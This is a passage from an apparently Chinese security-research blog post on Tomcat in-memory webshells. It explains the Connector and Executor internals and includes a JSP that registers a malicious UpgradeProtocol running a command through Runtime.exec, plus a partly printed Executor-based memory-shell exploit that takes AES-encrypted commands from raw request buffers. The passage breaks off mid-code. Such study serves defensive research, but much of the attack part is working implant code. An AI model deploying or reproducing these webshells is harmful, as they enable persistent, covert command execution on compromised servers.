class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.反射获取httpUpgradeProtocols</span><br>    <span class="hljs-type">RequestFacade</span> <span class="hljs-variable">rf</span> <span class="hljs-operator">=</span> (RequestFacade) request;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> RequestFacade.class.getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    requestField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request1</span> <span class="hljs-operator">=</span> (Request) requestField.get(rf);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> Request.class.getDeclaredField(<span class="hljs-string">&quot;connector&quot;</span>);<br>    connector.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Connector</span> <span class="hljs-variable">realConnector</span> <span class="hljs-operator">=</span> (Connector) connector.get(request1);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">protocolHandlerField</span> <span class="hljs-operator">=</span> Connector.class.getDeclaredField(<span class="hljs-string">&quot;protocolHandler&quot;</span>);<br>    protocolHandlerField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">AbstractHttp11Protocol</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);<br><br>    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">upgradeProtocolsField</span> <span class="hljs-operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="hljs-string">&quot;httpUpgradeProtocols&quot;</span>);<br>    upgradeProtocolsField.setAccessible(<span class="hljs-literal">true</span>);<br>    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);<br>    <span class="hljs-comment">//2.构造恶意的UpgradeProtocol</span><br>    <span class="hljs-type">UpgradeProtocol</span> <span class="hljs-variable">upgradeProtocol</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpgradeProtocol</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getHttpUpgradeName</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isSSLEnabled)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getAlpnIdentifier() &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAlpnName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Processor <span class="hljs-title function_">getProcessor</span><span class="hljs-params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> InternalHttpUpgradeHandler <span class="hljs-title function_">getInternalUpgradeHandler</span><span class="hljs-params">(Adapter adapter, org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//3.添加进upgradeProtocols</span><br>    upgradeProtocols.put(<span class="hljs-string">&quot;clown&quot;</span>,upgradeProtocol);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后访问的时候带上upgrade</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Upgrade: clown<br>Connection: Upgrade<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409222209433.png" alt="image-20240922220915371"></p><p><img src="https://cdn.clown2024.cn/202409222210497.png" alt="image-20240922221016377"></p><p>成功弹计算器</p><h1 id="tomcat-executor内存马"><a href="#Tomcat-Executor内存马" class="headerlink" title="Tomcat-Executor内存马"></a>Tomcat-Executor内存马</h1><p>参考文章：<a href="https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ">https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ</a></p><h2 id="执行流程分析"><a href="#执行流程分析" class="headerlink" title="执行流程分析"></a>执行流程分析</h2><p>这里临时插入重新分析一下Connector的流程，因为有点乱，导致我后面看Executor内存马会有点混乱</p><p><strong>服务的启动时</strong></p><p>这里就说一下各个类的初始化的顺序，从StandardService的初始化方法开始</p><p><img src="https://cdn.clown2024.cn/202409262315547.png" alt="image-20240926231523449"></p><blockquote><p>图只是参考，具体方法不一定对，因为是别人画的图，可能tomcat版本不一样方法名会有差异，这里按照的是我自己的版本分析</p></blockquote><p>StandardService#initInternal</p><p><img src="https://cdn.clown2024.cn/202409262320249.png" alt="image-20240926232011146"></p><p>这里执行了图中的三个init方法，重点看init方法，这里有executor.init()方法，但是此时executors数组为空所以没有执行，应该是在后面有请求的时候放入</p><p>这个connector是Connector类，然后init去到了父类LifecycleBase的init方法</p><p><img src="https://cdn.clown2024.cn/202409262327581.png" alt="image-20240926232630314"></p><p>然后再调用initInternal方法回到Connector</p><p><img src="https://cdn.clown2024.cn/202409262328153.png" alt="image-20240926232843081"></p><p>然后调用Http11NioProtocol#setAdapter设置一个adapter</p><p>然后往下调用了protocolHandler#init()方法</p><p><img src="https://cdn.clown2024.cn/202409262329171.png" alt="image-20240926232959094"></p><p>然后又走到父类AbstractHttp11Protocol的init方法</p><p><img src="https://cdn.clown2024.cn/202409262331554.png" alt="image-20240926233137474"></p><p>然后又掉用父类的AbstractProtocol的init方法</p><p><img src="https://cdn.clown2024.cn/202409262332748.png" alt="image-20240926233241664"></p><p>里面又调用NioEndpoint的init方法</p><p>然后又是走到父类AbstractJsseEndpoint的init方法</p><p><img src="https://cdn.clown2024.cn/202409262334655.png" alt="image-20240926233401589"></p><p>然后又调用父类的AbstractEndpoint的init方法</p><p><img src="https://cdn.clown2024.cn/202409262335562.png" alt="image-20240926233521470"></p><p>这里的bind方法就是调用NioEndpoint的bind方法来起一个socket服务监听端口了</p><p><img src="https://cdn.clown2024.cn/202409262336888.png" alt="image-20240926233650811"></p><p>默认的acceptCount是100，然后这就是大概的流程</p><p>顺便提一下，一开始的connector是有两个的，如下：</p><p><img src="https://cdn.clown2024.cn/202409262352133.png" alt="image-20240926235226049"></p><p><strong>接受请求后的分析</strong></p><p>这里就分析到Executor的位置，因为这是临时插入的下面已经写好了懒得动了😢</p><p>前面文章说到，接受了请求之后会传递给setSocketOptions方法</p><p><img src="https://cdn.clown2024.cn/202409270008999.png" alt="image-20240927000803914"></p><p>然后这里获取了Poller注册了channel</p><p><img src="https://cdn.clown2024.cn/202409270009941.png" alt="image-20240927000918856"></p><p>然后这个Poller也是实现了Runnable接口的，那后面就会走到他的run方法里面，我们看一下</p><p><img src="https://cdn.clown2024.cn/202409270011717.png" alt="image-20240927001157616"></p><p>然后processKey里面又会走到一个processSocket方法</p><p><img src="https://cdn.clown2024.cn/202409270012045.png" alt="image-20240927001244969"></p><p>然后就会走到我们要重点关注的<strong>executor.execute</strong>方法</p><p><img src="https://cdn.clown2024.cn/202409270013273.png" alt="image-20240927001342167"></p><blockquote><p>大概就是这样，但是调试的时候有时候流程还是会变得很怪，尤其是中间跳到Executor那一块，调的并不是很明白</p></blockquote><h2 id="原理分析"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h2><p>参考文章：<a href="https://xz.aliyun.com/t/11593?time__1311=n4+hiIqGx0xfxCw4mqGNapDNDkIetK4GOexAoTD&u_atoken=0088f6c6149c7ae10aab8ab2e8ed1bd8&u_asig=0a472f9217270143300633216e003d">Executor内存马的实现 - 先知社区 (aliyun.com)</a></p><p>这里又引用文章中connector的结构图：</p><p><img src="https://cdn.clown2024.cn/202409230948596.png" alt="image-20240923094855433"></p><p>connector就分为ProtocolHandler和Adapter，ProtocolHandler就用来处理请求，Adapter就是connector和container的桥梁，用于将处理后的请求传递给container</p><p>有关于ProtocolHandler的分类在前面的内存马也了解了一点，文章中又做了一个导图来分类更加清晰，也放一下</p><p><img src="https://cdn.clown2024.cn/202409230957003.png" alt="image-20240923095712898"></p><p>这里关注Http11NioProtocol的实现</p><p>Endpoint是ProtocolHandler的组成之一，而NioEndpoint是Http11NioProtocl中的实现。<br>Endpoint五大组件：</p><ul><li>LimitLatch：连接控制器，负责控制最大的连接数</li><li>Acceptor：负责接收新的连接，然后返回一个Channel对象给Poller</li><li>Poller：可以将其看成是NIO中Selector，负责监控Channel的状态</li><li>SocketProcessor：可以看成是一个被封装的任务类</li><li>Executor：Tomcat自己扩展的线程池，用来执行任务类</li></ul><p>重点看Executor的过程</p><p><img src="https://cdn.clown2024.cn/202409242331554.png" alt="image-20240924233136428"></p><p>我们这里在AbstractEndPoint#processSocket方法处打断点，可以看到他这里创建了一个Executor，然后下一步execute了一个线程任务</p><blockquote><p>在Tomcat中Executor由Service维护，因此同一个Service中的组件可以共享一个线程池。如果没有定义任何线程池，相关组件( 如Endpoint)会自动创建线程池，此时，线程池不再共享。</p></blockquote><p>跟进去execute方法看看</p><p><img src="https://cdn.clown2024.cn/202409242335057.png" alt="image-20240924233503993"></p><p><img src="https://cdn.clown2024.cn/202409242335760.png" alt="image-20240924233534681"></p><p>所以知道逻辑后和前面一样，继承对应的类然后将恶意代码重写进方法里面</p><p>这里的Executor类是ThreadPoolExecutor类</p><p><img src="https://cdn.clown2024.cn/202409271641484.png" alt="image-20240927164111381"></p><p>该类继承的源头就是Executor接口</p><p><img src="https://cdn.clown2024.cn/202409271644613.png" alt="image-20240927164456561"></p><p>文章中是继承了ThreadPoolExecutor类然后重写了execute方法，然后通过AbstractEndPoint的setExecutor方法将原来的executor替换为我们的恶意类即可</p><p><img src="https://cdn.clown2024.cn/202409271652002.png" alt="image-20240927165222949"></p><p><strong>替换Executor</strong></p><p>那要怎么替换executor呢，那照例最好也是从request看能不能找到AbstractEndPoint对象，恰好我们能找到这样的路径</p><p>request(RequestFacade)–&gt;request(Request)–&gt;connector(Connector)–&gt;protocolHandler(Http11NioProtocol)–&gt;endpoint(NioEndpoint)–&gt;acceptors(AbstractEndpoint)</p><p>然后也是和前面一样反射获取然后调用setExecutor方法即可</p><p><strong>回显问题</strong></p><p>现在我们虽然可以替换了，但是数据还无法回显出来，因为我们的ServletRequest还没有封装，需要到后面的Processor阶段才行，我们当前还在EndPoint阶段</p><p>那就需要我们能够挖掘出哪个对象里面存放着Request对象，我们需要挖出一条链子，然后我们往Request对象上封装我们的命令结果，比如将结果添加到请求头上回显出来</p><p>挖掘参考这篇文章，属实是学到了：<a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</a></p><p>里面有一个对象搜索工具，可以很方便的完成对request对象的搜索：<a href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p><blockquote><p>这个工具只有源码，我使用的时候是先用maven的install指令导出jar包到本地仓库，然后再通过pom文件来引入</p></blockquote><p>然后根据文档用下面代码搜索request</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@WebServlet(&quot;/test&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//设置搜索类型包含ServletRequest，RequstGroup，Request...等关键字的对象</span><br>        List&lt;Keyword&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;request&quot;</span>).build());<br>        <span class="hljs-comment">//设置黑名单</span><br>        List&lt;Blacklist&gt; blacklists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        blacklists.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blacklist</span>.Builder().setField_type(<span class="hljs-string">&quot;java.io.File&quot;</span>).build());<br>        <span class="hljs-comment">//新建一个广度优先搜索Thread.currentThread()的搜索器</span><br>        <span class="hljs-type">SearchRequstByBFS</span> <span class="hljs-variable">searcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);<br>        <span class="hljs-comment">//打开调试模式</span><br>        searcher.setIs_debug(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//挖掘深度为20</span><br>        searcher.setMax_search_depth(<span class="hljs-number">20</span>);<br>        <span class="hljs-comment">//设置报告保存位置</span><br>        searcher.setReport_save_path(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\ServletShell&quot;</span>);<br>        searcher.searchObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409272014082.png" alt="image-20240927201422968"></p><p>这里给出了很多的链子，我们Ctrl+F去搜索**request &#x3D;**找一下能利用的，文章中找的是这条链子</p><p><img src="https://cdn.clown2024.cn/202409272035854.png" alt="image-20240927203519789"></p><p>里面有个NioEndpoint，刚好是我们能获取到的，我们在这里下断点然后step over去调试</p><p><img src="https://cdn.clown2024.cn/202409272028044.png" alt="image-20240927202757759"></p><p>打完断点之后我们就到堆栈的Thread的位置开始顺着链子找</p><p><img src="https://cdn.clown2024.cn/202409272105715.png" alt="image-20240927210521619"></p><p>最终我们可以找到request</p><p>然后再往里找，可以找到一个inputBuffer，里面存放着我们的GET内容</p><p><img src="https://cdn.clown2024.cn/202409272109789.png" alt="image-20240927210934698"></p><p>可以将字节数组view as string，然后查看即可，现在我们就可以做到将命令放入request的请求头中，下一步就是要将其作为response的header传出</p><p>这里response对象和request在同一级下，都在connections里面</p><p><img src="https://cdn.clown2024.cn/202409272120291.png" alt="image-20240927212000209"></p><p>这样response我们也有了，提前将结果封装进response即可，现在就来编写内存马</p><h2 id="内存马编写"><a href="#内存马编写-2" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>留个坑先，分析得好累也还没明白，别人的内存马exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.ArrayList&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.RejectedExecutionHandler&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br><br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SECRET_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;blueblueblueblue&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AES</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] KEY_VI = <span class="hljs-string">&quot;blueblueblueblue&quot;</span>.getBytes();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CIPHER_ALGORITHM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">base64Encoder</span> <span class="hljs-operator">=</span> java.util.Base64.getEncoder();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">base64Decoder</span> <span class="hljs-operator">=</span> java.util.Base64.getDecoder();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br><br>            <span class="hljs-type">byte</span>[] byteContent = base64Decoder.decode(content);<br>            <span class="hljs-type">byte</span>[] byteDecode = cipher.doFinal(byteContent);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(byteDecode, java.nio.charset.StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br>            <span class="hljs-type">byte</span>[] byteEncode = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);<br>            <span class="hljs-type">byte</span>[] byteAES = cipher.doFinal(byteEncode);<br>            <span class="hljs-keyword">return</span> base64Encoder.encodeToString(byteAES);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getField</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Field declaredField;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> object.getClass();<br>        <span class="hljs-keyword">while</span> (clazz != Object.class) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br><br>                declaredField = clazz.getDeclaredField(fieldName);<br>                declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span> declaredField.get(object);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            &#125;<br>            clazz = clazz.getSuperclass();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getStandardService</span><span class="hljs-params">()</span> &#123;<br>        Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>            <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((thread.getName().contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="hljs-string">&quot;http&quot;</span>))) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">jioEndPoint</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    jioEndPoint = getField(target, <span class="hljs-string">&quot;this$0&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (jioEndPoint == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        jioEndPoint = getField(target, <span class="hljs-string">&quot;endpoint&quot;</span>);<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> jioEndPoint;<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//恶意executor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">threadexcutor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ThreadPoolExecutor</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">threadexcutor</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize, <span class="hljs-type">int</span> maximumPoolSize, <span class="hljs-type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> &#123;<br>            <span class="hljs-built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequest</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br><br><br>                                    Object[] objects = (Object[]) getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;nioChannels&quot;</span>), <span class="hljs-string">&quot;stack&quot;</span>);<br><br><br>                                    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">heapByteBuffer</span> <span class="hljs-operator">=</span> (ByteBuffer) getField(getField(objects[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;appReadBufHandler&quot;</span>), <span class="hljs-string">&quot;byteBuffer&quot;</span>);<br>                                    <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(heapByteBuffer.array(), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br><br>                                    <span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) &gt; -<span class="hljs-number">1</span>) &#123;<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>));<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br>                                        <span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a.substring(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) + <span class="hljs-string">&quot;blue0&quot;</span>.length() + <span class="hljs-number">1</span>, a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br><br>                                        b = decode(DEFAULT_SECRET_KEY, b);<br><br>                                        <span class="hljs-keyword">return</span> b;<br>                                    &#125;<br><br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    System.out.println(var11);<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();<br>        &#125;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title 